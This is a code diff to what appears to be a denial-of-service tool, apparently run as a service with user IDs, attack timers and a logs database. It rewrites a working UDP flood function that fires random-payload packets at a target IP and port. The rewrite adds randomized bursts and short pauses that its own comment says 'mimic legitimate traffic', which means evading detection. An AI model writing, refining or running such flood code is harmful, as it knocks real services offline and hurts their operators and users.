@@ -24,19 +24,28 @@ logs_collection = db["logs"]
 # Track active attack
 global_active_attack = Event()
 
-# UDP Flood Function
 def udp_flood(target_ip, target_port, stop_flag):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    while not stop_flag.is_set():
-        try:
-            packet_size = random.randint(64, 1469)
-            data = os.urandom(packet_size)
-            for _ in range(60000): 
-                sock.sendto(data, (target_ip, target_port))
-        except Exception as e:
-            logging.error(f"Error sending packets: {e}")
-            break
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        
+        while not stop_flag.is_set():
+            packet_size = random.randint(64, 1469)  # Randomized packet size
+            data = os.urandom(packet_size)  # Randomized payload
+            source_port = random.randint(1024, 65535)  # Randomized source port
+
+            # Dynamic traffic patterns
+            for _ in range(random.randint(1000, 5000)):
+                try:
+                    # Send data with randomized source port
+                    sock.sendto(data, (target_ip, target_port))
+                except Exception as inner_e:
+                    logging.error(f"Error during UDP flood: {inner_e}")
+            # Pause briefly to mimic legitimate traffic
+            if random.random() > 0.7:
+                time.sleep(random.uniform(0.01, 0.1))
+    except Exception as e:
+        logging.error(f"Error in UDP flood function: {e}")
 
 def start_udp_flood(user_id, target_ip, target_port, attack_time):
     if global_active_attack.is_set():
